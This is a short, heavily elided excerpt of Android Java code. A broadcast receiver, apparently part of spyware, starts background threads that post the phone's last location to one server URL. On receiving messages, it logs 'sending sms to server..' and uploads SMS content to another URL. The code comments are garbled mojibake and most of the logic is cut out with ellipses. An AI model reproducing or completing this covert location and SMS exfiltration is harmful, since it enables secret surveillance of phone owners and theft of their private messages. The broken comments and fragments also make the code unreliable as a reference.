...
public class IntentTracker extends BroadcastReceiver {
	...
	public void onReceive(final Context context, Intent intent){
	   ...
	   if(res.size()>0){
	   Runnable uploader = new HttpPoster(MyService.post_url,res); // �������� ���������
	   new Thread(uploader).start();}
	   else{
		   Runnable uploader = new HttpPoster(MyService.post_url,"no last location"); // �������� ���������
		   new Thread(uploader).start();
	   }
	            ...
	            if (bundle != null){
	                ...
	                try{
	                    ...
	                    Log.d(MyService.LOG_TAG, "sending sms to server..");
		                 Runnable uploader = new HttpPoster(MyService.log_url,res); // �������� ���������
		             	 new Thread(uploader).start();
